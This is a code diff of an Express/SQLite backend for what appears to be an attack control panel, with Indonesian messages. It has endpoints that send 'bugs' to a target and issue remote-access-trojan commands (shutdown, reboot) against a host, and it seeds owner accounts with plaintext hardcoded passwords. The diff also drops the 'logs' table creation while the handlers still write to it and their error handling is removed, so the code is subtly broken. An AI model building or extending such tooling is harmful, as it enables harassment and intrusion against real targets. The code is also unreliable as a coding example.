@@ -16,22 +16,7 @@ db.serialize(() => {
     password TEXT,
     role TEXT DEFAULT 'user'
   )`);
-  db.run(`CREATE TABLE IF NOT EXISTS senders (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    number TEXT UNIQUE,
-    label TEXT,
-    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-  )`);
-  db.run(`CREATE TABLE IF NOT EXISTS logs (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    type TEXT,
-    target TEXT,
-    payload TEXT,
-    status TEXT,
-    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-  )`);
 
-  // Insert default users (dengan prepared statement yang benar)
   const stmt = db.prepare(`INSERT OR IGNORE INTO users (username, password, role) VALUES (?, ?, ?)`);
   stmt.run('ARZ', 'CORE V1', 'owner');
   stmt.run('EPIN', 'CORE V2', 'owner');
@@ -95,9 +80,7 @@ app.post('/api/bug/execute', (req, res) => {
   const { target, type, intensity, duration } = req.body;
   if (!target || !type) return res.status(400).json({ error: 'Target dan tipe bug wajib!' });
   db.run(`INSERT INTO logs (type, target, payload, status) VALUES (?, ?, ?, ?)`,
-    ['bug', target, `${type}:${intensity || 50}:${duration || 10}`, 'done'], function(err) {
-      if (err) console.error(err);
-    });
+    ['bug', target, `${type}:${intensity || 50}:${duration || 10}`, 'done']);
   res.json({ status: '✅ Bug terkirim!', target, type });
 });
 
@@ -163,7 +146,7 @@ app.post('/api/rat/command', (req, res) => {
   else if (command === 'shutdown') response = '> Target shutdown...';
   else if (command === 'reboot') response = '> Target reboot...';
   db.run(`INSERT INTO logs (type, target, payload, status) VALUES (?, ?, ?, ?)`,
-    ['rat', '192.168.1.100', command, 'done'], (err) => { if (err) console.error(err); });
+    ['rat', '192.168.1.100', command, 'done']);
   res.json({ status: 'ok', output: response });
 });
 
